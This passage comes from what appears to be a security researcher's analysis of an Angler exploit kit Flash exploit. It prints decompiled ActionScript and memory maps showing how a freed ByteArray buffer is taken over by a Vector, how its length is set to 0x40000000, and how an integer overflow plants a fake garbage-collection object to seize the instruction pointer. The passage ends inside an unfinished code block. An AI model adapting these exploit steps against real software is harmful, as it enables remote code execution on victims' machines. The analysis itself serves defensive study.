id="crayon-5f69285f5679b211703890-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-17">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">attack</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">Boolean</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc1_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc3_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">byte_array_size</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-v">_loc3_</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">magic_read_uint</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">vector_elements</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">magic_read_uint</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">x86_url_checked</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">vector_signature_0</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-c">//unchained_elements = 1073741824 = 0x40000000</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">magic_write_uint</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-sy">,</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_elements</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">x86_url_checked</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-5f69285f5679b211703890-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f5679b211703890-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
<p></p>
<p style="text-align: center;"><strong> Figure 9.</strong> Angler&#8217;s Exploit Code Taking Over ByteArrayData Buffer and Changing its Size</p>
<p>Figure 10 is a memory map of relevant objects after the third stage. The freed ByteArrayData buffer starting at 0x05069000 (<span style="color: #ffcc00;">yellow</span>) has been taken over by the VectorData buffer that starts at 0x05069020 (<span style="color: #00ff00;">green</span>) and has a size of 0x72. The memory map also shows that the length of VectorData has been set to 0x40000000 (<span style="color: #ff0000;">red</span>).</p>
<p>domainMemory<br />
03ea5040 10c99fc8 03b4c190 0577f6d0 039f3080<br />
03ea5050 03ea6020 <span style="color: #ffcc00;">05069000</span> 00002000 03a36ea0<br />
03ea5060 00000003 03ea5040 039f1070 039f1040<br />
03ea5070 00000000 00000000<br />
+0x00: vtable of domainMemory<br />
+0x14: pointer to ByteArrayData</p>
<p>Vector&lt;uint&gt;<br />
05661538 10c99918 00000003 0555c1f0 03a44d78<br />
05661548 0555f150 00000000 <span style="color: #00ff00;">05069020</span> 00000000<br />
05661558 00000000 00000000<br />
0x00: vtable of Vector&lt;uint&gt;<br />
0x18: VectorData</p>
<p>Overlapped ByteArrayData[freed, +0x00 begin] and VectorData[taken over, +0x20 begin]<br />
<span style="color: #ffcc00;">05069000</span> 00000000 00000000 0506a000 05066000<br />
05069010 01f80008 00000000 00000000 10f69b44<br />
<span style="color: #00ff00;">05069020</span> <span style="color: #ff0000;">40000000</span> 0506bc00 feedbabe 00001590<br />
05069030 babeface 00000000 00000000 00000000<br />
05069040 00000000 00000000 00000000 00000000</p>
<p>…</p>
<p>050691e0 00000000 00000000 00000000 00000000<br />
050691f0 bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb<br />
05069200 bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb<br />
05069210 bbbbbbbb bbbbbbbb 00000072 03b3b000<br />
05069220 feedbabe 00001591 babeface 00000000<br />
05069230 00000000 00000000 00000000 00000000</p>
<p>…</p>
<p>05069020+0x00: vector length modified to 0x40000000 by alchemy opcode of domainMemory<br />
05069020+0x04: GC_object&lt;***important***&gt;<br />
05069020+0x08: vector[0]<br />
05069218+0x00: length of the next adjacent vector</p>
<p style="text-align: center;"><strong>Figure 10. </strong>Memory Map Showing the ByteArrayData Buffer Taken Over by Vector Buffer</p>
<p>The last stage starts by finding the vector with the size of 0x40000000 by comparing the original length to current length. Figure 11 shows a function named ‘find_unchained_vector’ within the ActionScript that locates the vector, specifically seen in red text. The ActionScript will use this vector to scan memory to find ROP chain, construct and write ROP chain and shellcode (obtained from flashvars) to the VectorData buffer, which is a fairly conventional process. The interesting part of the exploitation process involves the use of the garbage collection (GC) to control the instruction pointer (EIP) instead of the typical usage of a sound or file reference object to control EIP[2]. The exploit code uses the garbage collection (GC) to control EIP by faking a GC_object at offset 0x04 of the VectorData buffer and will overwrite it to the controlled fake_GC_object, which is carried out by a function named “take_over_32” in Figure 11. According to the memory map in Figure 10, the first element of vector is offset 0x08 (vector[0]), but the ActionScript overwrites the offset 0x04 instead, which is interesting and required additional analysis.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69285f567a0438749509" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
      private function find_unchained_vector() : Boolean
      {
         var _loc1_:Vector.&lt;uint&gt; = null;
         var _loc2_:* = 0;
         while(_loc2_ &lt; this.vectors_count)
         {
            _loc1_ = this.vectors[_loc2_] as Vector.&lt;uint&gt;;
            if(!(_loc1_.length == this.vector_elements) &amp;&amp; !(_loc1_.length == this.vector_elements * 2))
            {
               this.unchained_vector_index = _loc2_;
               this.unchained_vector = _loc1_;
               return true;
            }
            _loc2_++;
         }
         return false;
      }

      private function take_over_32() : Boolean
      {  //unchained_elements = 1073741824 = 0x40000000
         var _loc1_:uint = this.unchained_elements - 1;
         this.unchained_vector[_loc1_] = this.fake_object_address;
         this.unchained_vector.length = this.vector_elements * 2;
         this.restore_vector_32();
         return true;
      }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-2">2</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-4">4</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-6">6</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-8">8</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-10">10</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-12">12</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-14">14</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-16">16</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-18">18</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-20">20</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-22">22</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-24">24</div><div class="crayon-num" data-line="crayon-5f69285f567a0438749509-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a0438749509-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69285f567a0438749509-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">find_unchained_vector</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">Boolean</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc1_</span><span class="crayon-o">:</span><span class="crayon-v">Vector</span><span class="crayon-sy">.</span><span class="crayon-o">&lt;</span><span class="crayon-v">uint</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-o">:</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-v">_loc2_</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">vectors_count</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc1_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">vectors</span><span class="crayon-sy">[</span><span class="crayon-v">_loc2_</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">Vector</span><span class="crayon-sy">.</span><span class="crayon-o">&lt;</span><span class="crayon-v">uint</span><span class="crayon-o">&gt;</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">vector_elements</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">_loc1_</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e ">vector_elements *</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_vector_index</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">_loc2_</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_vector</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">_loc1_</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">_loc2_</span><span class="crayon-o">++</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-18">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a0438749509-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">private</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">take_over_32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">Boolean</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-c">//unchained_elements = 1073741824 = 0x40000000</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">_loc1_</span><span class="crayon-o">:</span><span class="crayon-v">uint</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_elements</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_vector</span><span class="crayon-sy">[</span><span class="crayon-v">_loc1_</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">fake_object_address</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">unchained_vector</span><span class="crayon-sy">.</span><span class="crayon-v">length</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e ">vector_elements *</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">restore_vector_32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f69285f567a0438749509-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a0438749509-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p></p>
<p style="text-align: center;"><strong> Figure 11. </strong>Angler&#8217;s ActionScript Code to Find and Take Over the Vector</p>
<p>From within the ActionScript, we can see it specifically set vector[3fffffff] to fake_gc_object, which Flash will calculate the offset like this in the following manner:</p>
<p>Vector[index] -&gt; [VectorData+index*4+8]<br />
When index = 3fffffff<br />
[VectorData+0x3fffffff*4+8] = [VectorData+0xfffffffc+8] = [VectorData+0x04]</p>
<p>Based on the calculation above, it is obvious that the ActionScript uses an integer overflow to set vector+0x04 offset. After setting the vector+0x04 to the fake_gc_object, it resets the vector length (unchained_vector.length) to release the old vector and triggers garbage collection (GC) to collect this vector. When the garbage collector collects the vector it uses the fake_gc_object, gets an unknown object from this fake_gc_object and peforms a vtable call on this unknown object.</p>
<p>Figure 12 shows the trace route of the garbage collector and the memory map in the last stage to show the process in which exploiters use to control the instruction pointer to execute code. This will not show the entire process of the garbage collector, instead it begins from finding the vector to be collected and ends with the vtable call on the unknown object that provides exploiters control over the EIP.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69285f567a7439638303" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
